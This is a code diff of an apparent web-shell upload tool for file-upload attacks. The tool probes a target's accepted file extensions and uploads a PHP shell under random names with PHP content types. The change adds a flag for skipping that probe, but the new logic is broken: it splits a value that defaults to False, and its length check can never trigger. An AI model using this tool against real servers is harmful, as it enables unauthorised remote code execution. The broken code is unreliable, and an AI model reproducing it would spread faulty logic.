@@ -43,7 +43,7 @@ parser.add_argument('-r', "--request-file", dest="request_file", default=False, 
 parser.add_argument('-t', "--true-regex", type=str, dest="true_regex", default=False,help=f"{red}Required{reset} - Provide the success message when a file is uploaded\n{reset}Usage: {blue}-s /--success {reset}{red_italic}'File uploaded successfully.'{reset}")
 parser.add_argument('-f', "--false-regex", type=str, dest="false_regex", default=False,help=f"{red}Required{reset} - Provide a failure message when a file is uploaded\n{reset}Usage: {blue}-f /--failure {reset}{red_italic}'File is not allowed!'{reset}")
 #parser.add_argument('-e', "--extension", type=str, dest="file_extension", default="not_selected", help=f"{red}Required {reset}- Provide server backend extension\n{reset}Usage: {blue}-e / --extension {reset}{red_italic}php (Supported extensions: php,asp,jsp,perl,coldfusion){reset}")
-#parser.add_argument('-a', "--allowed-extensions", type=str, dest="allowed_extensions", default=False, help=f"{red}Required {reset}- Provide allowed extensions to be uploaded\n{reset}Usage: {blue}-a /--allowed {reset}{red_italic}jpeg, png, zip, etc'{reset}")
+parser.add_argument('-a', "--accepted-extensions", type=str, dest="accepted_extensions", default=False, help=f"Provide allowed extensions to be uploaded, skips the in-built check\n{reset}Usage: {blue}-a /--accepted-extensions jpeg,png,zip'{reset}")
 parser.add_argument('-d', "--upload-dir", type=str, dest="upload_dir", default=False, help=f'Provide a remote path where the WebShell will be uploaded (won\'t work if the file will be uploaded with a UUID).\n{reset}Usage: {blue}-l / --location {reset}{red_italic}/uploads/{reset}')
 #parser.add_argument('-o', "--output", type=str, dest="output_location",help=f'Output directory (not file) to save the results in - Default is the current directory.\n{reset}Usage: {blue}-o / --output {reset}{red_italic}~/Desktop/example.com/{reset}',default=False)
 parser.add_argument("--rate-limit", type=float, dest="rate_limit", default=0.1,help=f'Set rate-limiting with seconds between each request.\nUsage: {blue}--rate-limit {reset}')
@@ -384,31 +384,33 @@ def main():
         warning("Upload location not set, defaulting to '/'")
 
     variations.protocol = options.protocol
-
-    #Test for accepted formats
-    info("Testing for accepted file types")
-    print()
     session = requests.Session()
     content, headers, host, path = parse_request_file(options.request_file)
     upload_url = f"http://{host}{options.upload_dir}"
 
-    accepted_extensions = test_accepted_formats(options.request_file, session, variations.extensions["normal"])
-    debug(accepted_extensions, 3)
+    accepted_extensions = options.accepted_extensions.split(",")
+    if (len(accepted_extensions) < 1):
+        #Test for accepted formats
+        info("Testing for accepted file types")
+        print()
+    
+        accepted_extensions = test_accepted_formats(options.request_file, session, variations.extensions["normal"])
+        debug(accepted_extensions, 3)
 
-    accepted_php_extensions = test_accepted_formats(options.request_file, session, variations.extensions["php"])
-    debug(accepted_extensions, 3)
+        accepted_php_extensions = test_accepted_formats(options.request_file, session, variations.extensions["php"])
+        debug(accepted_extensions, 3)
 
-    if (len(accepted_extensions) < 1 and len(accepted_php_extensions) < 1):
-        error("No accepted extensions found")
+        if (len(accepted_extensions) < 1 and len(accepted_php_extensions) < 1):
+            error("No accepted extensions found")
 
-    if (len(accepted_php_extensions) > 0):
-        for accepted_php_extension in accepted_php_extensions:
-            info(f"Trying to upload .{accepted_php_extension} shell...")
-            with open("assets/shells/simple.php", 'rb') as file: file_data = file.read()
-            file_name = generate_random_string(10) + f".{accepted_php_extension}"
-            response, session, headers, url, file_name = upload_and_validate(options.request_file, session, file_data, file_name, "application/x-httpd-php")
+        if (len(accepted_php_extensions) > 0):
+            for accepted_php_extension in accepted_php_extensions:
+                info(f"Trying to upload .{accepted_php_extension} shell...")
+                with open("assets/shells/simple.php", 'rb') as file: file_data = file.read()
+                file_name = generate_random_string(10) + f".{accepted_php_extension}"
+                session = upload_and_validate(options.request_file, session, file_data, file_name, "application/x-httpd-php")
 
-            
+                
 
     #Loop through modules
     print()
